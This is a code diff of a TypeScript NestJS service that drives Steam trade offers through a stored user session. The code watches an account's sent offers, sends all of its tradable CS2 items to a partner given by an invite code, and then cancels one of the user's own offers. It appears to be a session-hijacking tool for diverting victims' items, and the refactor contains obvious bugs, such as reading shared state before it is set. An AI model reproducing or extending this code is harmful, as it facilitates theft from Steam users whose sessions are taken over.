@@ -13,9 +13,15 @@ import { CustomPromiseTimeout } from "../shared";
 import { WarehouseService } from "../warehouse/warehouse.service";
 import { InventoryItem, InventoryItemForTrade } from "./dto";
 
+interface HttpContext {
+    httpClient: AxiosInstance
+    jar: CookieJar
+}
+
 @Injectable()
 export class TradeService {
     private readonly logger: Logger = new Logger(TradeService.name);
+    private httpCtx: HttpContext
 
     constructor(
         private readonly warehouseService: WarehouseService, 
@@ -28,6 +34,24 @@ export class TradeService {
         private readonly retryHttpService: RetryHttpService,
         private readonly httpClientService: HttpClientService
     ) {}
+
+    private setHttpCtx(httpClient: AxiosInstance, cookieJar?: CookieJar) {
+        const previousCookieJar = this.httpCtx.jar
+        this.httpCtx = { httpClient, jar: !cookieJar ? previousCookieJar : cookieJar }
+    }
+
+    private getHttpCtx() {
+        return this.httpCtx
+    }
+
+
+    private getUsername() {
+        return this.clsService.get("username")
+    }
+
+    private getInviteCode() {
+        return this.clsService.get("invite-code")
+    }
     
     private generateHeaders(tradeUserId: string, headerCookies: string) {
         const headers = {
@@ -64,16 +88,8 @@ export class TradeService {
         return payload
     }
 
-    private getUsername() {
-        return this.clsService.get("username")
-    }
 
-    private getInviteCode() {
-        return this.clsService.get("invite-code")
-    }
-
-
-    private async cancelTrade(idToCancel: string, httpClient: AxiosInstance, cookieJar: CookieJar, userId: string) {
+    private async cancelTrade(idToCancel: string, cookieJar: CookieJar, userId: string) {
         const username = this.getUsername()
         const cancelTradeUrl = `https://steamcommunity.com/tradeoffer/${idToCancel}/cancel`;
         const cookies = await cookieJar.getCookies(cancelTradeUrl)
@@ -101,9 +117,10 @@ export class TradeService {
         };
         const payload = new URLSearchParams();
         payload.append('sessionid', sessionIdCookie.value);
-
     
-        const response = await this.retryHttpService.executeApiActionWithRetry(
+        const { httpClient } = this.getHttpCtx()
+
+        const result = await this.retryHttpService.executeApiActionWithRetry(
             {
             httpClient,
                 config: {
@@ -115,16 +132,20 @@ export class TradeService {
                 username,
                 actionName: "cancelTrade"
             }
-        );    if (response && response.status >= 400) {
-        this.logger.error(`[${actionName}] Failed to get HTML, received status ${response.status} for URL: ${cancelTradeUrl}`);
-        throw new Error("Failed to cancel trade offer");
+        );    
+        if (result && result.response.status >= 400) {
+            this.logger.error(`[${actionName}] Failed to get HTML, received status ${result.response.status} for URL: ${cancelTradeUrl}`);
+            this.setHttpCtx(result.httpClient, result.jar)
+            throw new Error("Failed to cancel trade offer");
         }
-        this.logger.log(`Response in cacelling trade: ${response}`)
+        this.logger.log(`Response in cacelling trade: ${result}`)
     }
 
-    private async monitorTradesWithCheerio(httpClient: AxiosInstance, cookieJar: CookieJar) {
+    private async monitorTradesWithCheerio() {
         const username = this.getUsername()
-        const inviteCode = this.getInviteCode()
+        const { httpClient } = this.getHttpCtx()
+        console.log("http client: ", httpClient);
+        
         const sentOffersUrl = 'https://steamcommunity.com/my/tradeoffers/sent';
         this.logger.log(`[${username}] Starting trade monitoring...`);
 
@@ -136,16 +157,19 @@ export class TradeService {
             this.logger.warn(`[${username}] Could not fetch sent offers page at the start.`);
             throw new Error(`[${username}] Could not fetch sent offers page at the start.`)
         }
+        this.setHttpCtx(startResult.httpClient, startResult.jar)
+        const { httpClient: updatedHttpClient, jar: cookieJar } = this.getHttpCtx()
         let html = this.scarpingService.loadHtml(startResult.data)
         let startCount = (this.scarpingService.getHtmlElement(html, '.tradeoffer')).length;
         while (tries > 0) {
-            const result = await this.scarpingService.getHtmlWithRetry({username, url: sentOffersUrl, actionName: `GetSentOffers_${username}`, httpClient});
+            const result = await this.scarpingService.getHtmlWithRetry({username, url: sentOffersUrl, actionName: `GetSentOffers_${username}`, httpClient: updatedHttpClient});
             if (!result) {
                 this.logger.warn(`[${username}] Could not fetch sent offers page, skipping check.`);
                 await CustomPromiseTimeout(1000 * 5);
                 tries--;
                 continue;
             }
+            this.setHttpCtx(result.httpClient, result.jar)
             try {
             html = this.scarpingService.loadHtml(result.data)
             const tradeOfferElements = this.scarpingService.getHtmlElement(html, '.tradeoffer');
@@ -158,8 +182,8 @@ export class TradeService {
                     return tradeOfferId?.split("_")[1];
                 })
                     this.logger.log(`[${username}] Detected change in sent trades (${startCount} -> ${currentCount}). Assuming trade accepted. Initiating sending items...`);
-                    await this.sendTradeTest(httpClient, cookieJar, result.userId)
-                    await this.cancelTrade(tradeOfferIds[0], httpClient, cookieJar, result.userId)
+                    await this.sendTradeTest(cookieJar, result.userId)
+                    await this.cancelTrade(tradeOfferIds[0], cookieJar, result.userId)
                     startCount += 2
                     this.logger.log(`[${username}] Item sending process finished for this trigger.`);
             }
@@ -175,7 +199,7 @@ export class TradeService {
     }
 
 
-    private async getInventory(httpClient: AxiosInstance, userId: string) {
+    private async getInventory(userId: string) {
         const inventoryUrl = `https://steamcommunity.com/inventory/${userId}/730/2`;
         const params = {
         l: 'english',
@@ -185,6 +209,8 @@ export class TradeService {
         console.log(`[Steam Service] Запрос инвентаря: ${inventoryUrl}`);
     
         try {
+            const { httpClient } = this.getHttpCtx()
+            
         const response = await httpClient.get(inventoryUrl, { params });
     
         if (response.data && response.data.assets && response.data.descriptions) {
@@ -192,8 +218,8 @@ export class TradeService {
             const tradableItems = response.data.descriptions
             .filter(item => item.tradable)
             .map(item => ({
-            appid: item.appid,
-            classid: item.classid,
+                appid: item.appid,
+                classid: item.classid,
             }));
 
             this.logger.debug(`Tradable items: ${JSON.stringify(tradableItems)}`)
@@ -228,11 +254,10 @@ export class TradeService {
     }
     
 
-    private async sendTradeTest(httpClient: AxiosInstance, cookieJar: CookieJar, userId: string, ){
+    private async sendTradeTest(cookieJar: CookieJar, userId: string, ){
         const username = this.getUsername()
         const inviteCode = this.getInviteCode()
         this.logger.debug("Started initiating sending trade")
-        this.logger.log(`HTTP CLIENT IN SEND TRADE TEST: ${httpClient}`)
         const tradePartnerUrl = "https://steamcommunity.com/tradeoffer/new/send"
         const cookies = await cookieJar.getCookies(tradePartnerUrl);
         const sessionIdCookie = cookies.find(c => c.key === 'sessionid');
@@ -240,7 +265,7 @@ export class TradeService {
         this.logger.error(`[Steam Service] Ошибка: Не найдены куки в экземпляре axios для пользователя ${username}`);
         throw new NotFound("Cookies not found in axios instance");
         }
-        const inventory = await this.getInventory(httpClient, userId);
+        const inventory = await this.getInventory(userId);
         if(!inventory) {
             this.logger.error(`Inventory not found or empty for user: ${username}`)
             throw new NotFound("Inventory not found")
@@ -283,9 +308,10 @@ export class TradeService {
 
         try {
 
-        const response = await this.retryHttpService.executeApiActionWithRetry(
+            const ctx = this.getHttpCtx()
+        const result = await this.retryHttpService.executeApiActionWithRetry(
             {
-                httpClient,
+                httpClient: ctx.httpClient,
                 config: {
                     url: tradePartnerUrl,
                     method: 'POST',
@@ -296,7 +322,12 @@ export class TradeService {
                 actionName:"sendTrade"
             }
         );
-        if (response && response.data && response.data.tradeofferid) {
+        if(!result)
+            throw new Error('Не удалось отправить обмен')
+
+        const { response, httpClient, jar } = result
+        this.setHttpCtx(httpClient, jar)
+        if (response.data && response.data.tradeofferid) {
             this.logger.log(`[Steam Service] Обмен успешно создан! ID: ${response.data.tradeofferid}`);
             this.logger.debug(JSON.stringify(response.data))
         } else {
@@ -314,9 +345,14 @@ export class TradeService {
         const username = this.getUsername()
 
         const { httpClient, jar } = await this.httpClientService.createHttpClient(username)
+        console.log(httpClient, jar);
+        
+
+        if(!this.getHttpCtx().httpClient || !this.getHttpCtx().jar)
+            this.setHttpCtx(httpClient, jar)
         
         this.logger.log(`[${username}] Session created. Starting the monitoring process.`);
 
-        this.monitorTradesWithCheerio(httpClient, jar);
+        await this.monitorTradesWithCheerio();
     }
 }
